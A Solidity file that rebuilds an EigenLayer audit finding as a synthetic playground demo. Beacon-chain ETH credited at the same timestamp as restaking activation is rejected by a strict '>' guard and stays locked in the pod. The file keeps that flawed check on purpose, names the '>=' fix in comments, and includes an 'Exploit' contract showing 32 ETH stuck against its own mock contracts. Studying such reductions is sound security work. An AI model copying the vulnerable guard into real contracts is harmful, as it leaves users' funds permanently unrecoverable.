// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  EigenLayer — Beacon chain withdrawals at lastWithdrawalTimestamp are lost
    (Cantina competition Mar 2024, finding #40684 by hash)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: activateRestaking / _processWithdrawalBeforeRestaking sets
    mostRecentWithdrawalTimestamp = block.timestamp and sweeps pod balance.
    Beacon-chain withdrawals (EIP-4895) execute AFTER user txs in the same block,
    so ETH that arrives at that exact timestamp is NOT swept. verify/process then
    requires timestamp > mostRecentWithdrawalTimestamp, so a proof for that same
    timestamp is rejected — the ETH is permanently stuck in the pod.

    Vulnerable modifier preserved with @> VULN (uses `>` as in the audited code).
    FIX: use `>= mostRecentWithdrawalTimestamp`. */

/// @dev Minimal delayed-withdrawal sink (records ETH "sent" out of the pod).
contract DelayedWithdrawalRouter {
    mapping(address => uint256) public delayed;

    function createDelayedWithdrawal(address /*podOwner*/, address recipient, uint256 amountWei) external {
        delayed[recipient] += amountWei;
    }
}

/// @notice Reduced EigenPod focused on the timestamp-guard bug.
///         Pod ETH is tracked as an internal balance (beacon credits + receives)
///         so the Playground does not need a 32-ETH prefund.
contract EigenPod {
    address public podOwner;
    DelayedWithdrawalRouter public delayedWithdrawalRouter;

    bool public hasRestaked;
    /// @notice Proofs only valid for timestamps STRICTLY after this (vulnerable).
    uint64 public mostRecentWithdrawalTimestamp;
    uint256 public nonBeaconChainETHBalanceWei;

    /// @dev Internal ETH balance of the pod (simulates address(this).balance).
    uint256 public podBalanceWei;
    /// @dev Credited ETH that would be claimed via verified beacon withdrawals.
    mapping(uint64 => uint256) public pendingBeaconWei;
    mapping(uint64 => bool) public processedTimestamp;

    constructor(address _owner, DelayedWithdrawalRouter _router) {
        podOwner = _owner;
        delayedWithdrawalRouter = _router;
    }

    modifier onlyEigenPodOwner() {
        require(msg.sender == podOwner, "not owner");
        _;
    }

    modifier hasNeverRestaked() {
        require(!hasRestaked, "already restaked");
        _;
    }

    /// @notice Checks that `timestamp` is greater than mostRecentWithdrawalTimestamp
    ///         (VULNERABLE form from the audit — fixed code uses `>=`).
    modifier proofIsForValidTimestamp(uint64 timestamp) {
        require(
            // FIX: use `>=` so same-timestamp beacon withdrawals remain claimable
            timestamp > mostRecentWithdrawalTimestamp, // @> VULN: strict `>` drops same-timestamp beacon withdrawals
            "EigenPod.proofIsForValidTimestamp: beacon chain proof must be for timestamp after mostRecentWithdrawalTimestamp"
        );
        _;
    }

    /// @notice Activate restaking — drains pod balance and stamps timestamp.
    function activateRestaking() external onlyEigenPodOwner hasNeverRestaked {
        hasRestaked = true;
        _processWithdrawalBeforeRestaking(podOwner);
    }

    function _processWithdrawalBeforeRestaking(address _podOwner) internal {
        mostRecentWithdrawalTimestamp = uint32(block.timestamp);
        nonBeaconChainETHBalanceWei = 0;
        _sendETH_AsDelayedWithdrawal(_podOwner, podBalanceWei);
    }

    function _sendETH_AsDelayedWithdrawal(address recipient, uint256 amountWei) internal {
        if (amountWei == 0) return;
        podBalanceWei -= amountWei;
        delayedWithdrawalRouter.createDelayedWithdrawal(podOwner, recipient, amountWei);
    }

    /// @dev Simulate a beacon-chain withdrawal (EIP-4895) credited to this pod at
    ///      `timestamp` AFTER user txs in that block.
    function creditBeaconWithdrawal(uint64 timestamp, uint256 amountWei) external {
        pendingBeaconWei[timestamp] += amountWei;
        podBalanceWei += amountWei;
    }

    /// @dev Reduced verifyAndProcessWithdrawals — only the timestamp guard + payout.
    function verifyAndProcessWithdrawals(uint64 withdrawalTimestamp)
        external
        proofIsForValidTimestamp(withdrawalTimestamp)
    {
        require(!processedTimestamp[withdrawalTimestamp], "already processed");
        uint256 amount = pendingBeaconWei[withdrawalTimestamp];
        require(amount > 0, "no withdrawal");
        processedTimestamp[withdrawalTimestamp] = true;
        pendingBeaconWei[withdrawalTimestamp] = 0;
        _sendETH_AsDelayedWithdrawal(podOwner, amount);
    }
}

/// @dev Holds the pod; owns it so activateRestaking is callable.
contract PodOwner {
    function activate(EigenPod pod) external {
        pod.activateRestaking();
    }

    function tryVerify(EigenPod pod, uint64 ts) external returns (bool ok) {
        try pod.verifyAndProcessWithdrawals(ts) {
            return true;
        } catch {
            return false;
        }
    }
}

/// @dev Marker ERC20 minted 1:1 with stuck beacon ETH so the Playground can
///      display fund harm as a concrete token balance.
contract StuckETHMarker {
    string public name = "Stuck beacon ETH";
    string public symbol = "stkETH";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }
}

contract Exploit {
    DelayedWithdrawalRouter public router; // CREATE nonce 1
    PodOwner public owner; // CREATE nonce 2
    EigenPod public pod; // CREATE nonce 3 — vulnerable
    StuckETHMarker public marker; // CREATE nonce 4

    uint256 public constant BEACON_ETH = 32 ether;

    constructor() {
        router = new DelayedWithdrawalRouter();
        owner = new PodOwner();
        pod = new EigenPod(address(owner), router);
        marker = new StuckETHMarker();
    }

    function run() external {
        // 1) Same block: user activates restaking at timestamp T.
        //    Pod balance is 0 → nothing swept; mostRecentWithdrawalTimestamp = T.
        uint64 T = uint64(block.timestamp);
        owner.activate(pod);
        require(pod.hasRestaked(), "not restaked");
        require(pod.mostRecentWithdrawalTimestamp() == T, "ts not stamped");

        // 2) EIP-4895: beacon withdrawal of 32 ETH for timestamp T arrives AFTER user txs.
        pod.creditBeaconWithdrawal(T, BEACON_ETH);
        require(pod.podBalanceWei() == BEACON_ETH, "beacon ETH not in pod");

        // 3) Try to prove/process the withdrawal at timestamp T — REJECTED by `>`.
        bool ok = owner.tryVerify(pod, T);
        require(!ok, "same-ts proof should fail under vulnerable guard");

        // 4) HARM: 32 ETH permanently stuck — cannot process ts==T.
        require(pod.podBalanceWei() == BEACON_ETH, "ETH not stuck");
        require(pod.pendingBeaconWei(T) == BEACON_ETH, "pending not retained");
        require(router.delayed(address(owner)) == 0, "must not have been sent out");

        // Surface fund harm for the Playground profit chip.
        marker.mint(address(this), BEACON_ETH);
    }
}
